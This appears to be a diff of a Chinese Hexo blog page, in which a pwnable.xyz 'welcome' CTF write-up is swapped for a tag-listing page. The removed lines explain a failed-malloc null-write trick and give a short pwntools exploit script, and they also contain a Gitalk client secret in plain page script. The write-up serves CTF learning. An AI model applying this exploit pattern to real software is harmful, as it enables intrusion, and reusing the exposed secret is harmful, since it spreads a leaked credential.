@@ -3,7 +3,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>pwnable.xyz welcome WriteUp - 广莫之野</title>
+  <title>标签：pwn - 广莫之野</title>
   <meta charset="UTF-8">
   <meta name="description" content>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -11,22 +11,13 @@
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta name="description" content="开始做pwnable.xyz上的题目了，记录下做题的思路。">
-<meta name="keywords" content="ctf,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.xyz welcome WriteUp">
-<meta property="og:url" content="http://shiroinu.top/2019/08/07/pwnable-xyz-welcome-WriteUp/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="广莫之野">
+<meta property="og:url" content="http://shiroinu.top/tags/pwn/page/2/index.html">
 <meta property="og:site_name" content="广莫之野">
-<meta property="og:description" content="开始做pwnable.xyz上的题目了，记录下做题的思路。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://i1.fuimg.com/696456/119eebdc5119a96f.png">
-<meta property="og:image" content="http://i1.fuimg.com/696456/12e8d4e4025934aa.png">
-<meta property="og:image" content="http://i1.fuimg.com/696456/186e0c53b922e2b4.png">
-<meta property="og:updated_time" content="2019-08-07T12:25:30.771Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.xyz welcome WriteUp">
-<meta name="twitter:description" content="开始做pwnable.xyz上的题目了，记录下做题的思路。">
-<meta name="twitter:image" content="http://i1.fuimg.com/696456/119eebdc5119a96f.png">
+<meta name="twitter:title" content="广莫之野">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
@@ -34,7 +25,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1575554516926">
+  <link rel="stylesheet" href="/css/style.css?v=1575554517049">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -130,76 +121,39 @@
   </div>
   <div id="nexmoe-content">
     <div class="nexmoe-primary">
-        <div class="nexmoe-post">
-    <div class="nexmoe-post-cover"> 
-        
-            <img src="/images/back1.png">
-        
-        <h1>pwnable.xyz welcome WriteUp</h1>
+        <section class="nexmoe-posts" id="brand-waterfall">
+    
+    <div class="nexmoe-post">
+        <a href="/2019/08/07/pwnable-xyz-welcome-WriteUp/">
+            <div class="nexmoe-post-cover mdui-ripple"> 
+                
+                    <img src="/images/back1.png" alt="pwnable.xyz welcome WriteUp">
+                
+                <h1>pwnable.xyz welcome WriteUp</h1>
+            </div>
+        </a>
+        <div class="nexmoe-post-meta">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2019年08月07日</a>
+            <a><i class="nexmoefont icon-areachart"></i>222 字</a>
+            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+            
+            
+                <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+            
+        </div>
+        <article>
+            
+            <p>开始做pwnable.xyz上的题目了，记录下做题的思路。</p>
+            
+        </article>
     </div>
-  <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年08月07日</a>
-    <a><i class="nexmoefont icon-areachart"></i>222 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
     
-    
-      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
-    
-  </div>
-  <article>
-    <p>开始做pwnable.xyz上的题目了，记录下做题的思路。</p>
-<a id="more"></a>
-
-
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="http://i1.fuimg.com/696456/119eebdc5119a96f.png" alt="Markdown"></p>
-<p>​        </p>
-<p>​    下载后解压，试运行：</p>
-<p><img src="http://i1.fuimg.com/696456/12e8d4e4025934aa.png" alt="Markdown"></p>
-<p>​    拖进IDA中查看源码:  </p>
-<p><img src="http://i1.fuimg.com/696456/186e0c53b922e2b4.png" alt="Markdown"></p>
-<p>发现Leak给出的是v3的地址，而题目的目的是要将<code>*v3</code>的值改为<code>0</code>，这将会是一个突破口。在一开始我以为<code>malloc()</code>函数申请的两个空间是连续的，但在gdb中运行后发现并不如此。  </p>
-<p><strong>关键点</strong></p>
-<ol>
-<li><p><code>malloc()</code>函数在申请空间失败时返回<code>NULL</code> ,且NULL == 0.</p>
-</li>
-<li><p><code>v5[size - 1]</code> == <code>*(v5 + (size-1) * sizeof(char) )</code>  </p>
-</li>
-</ol>
-<p>因此当我们使得<code>malloc()</code>函数分配空间失败时，v5 == 0 ，就可以实现对<code>hex(size-1)</code>地址的赋值为0操作，即可获得flag。  </p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>from pwn import *
-sh = remote(&quot;svc.pwnable.xyz&quot;,30000)
-sh.recvuntil(&quot;Leak:&quot;)
-leak = sh.recvline()
-#print(leak)
-payload = str(int(leak,16) + 1)
-#print(payload)
-sh.recvuntil(&quot;Length of your message: &quot;)
-sh.sendline(payload)
-sh.recv()
-sh.sendline(&quot; &quot;)
-print(sh.recv())</code></pre>
-  </article>
-  
-    
-
-  
-  <section class="nexmoe-comment">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
-<div id="gitalk"></div>
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
-<script type="text/javascript">
-    var gitalk = new Gitalk({
-        clientID: '80b2453b6d5f37ad6225',
-        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
-        id: window.location.pathname,
-        repo: 'nexmoe.github.io',
-        owner: 'nexmoe',
-        admin: 'nexmoe'
-    })
-    gitalk.render('gitalk')
-</script>
 </section>
-</div>
+
+    <nav class="nexmoe-page-nav">
+      <a class="extend prev" rel="prev" href="/tags/pwn/"><i class="nexmoefont icon-left"></i></a><a class="page-number" href="/tags/pwn/">1</a><span class="page-number current">2</span>
+    </nav>
+  
     </div>
   </div>
   <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
@@ -215,7 +169,7 @@ print(sh.recv())</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1575554516930"></script>
+<script src="/js/app.js?v=1575554517052"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
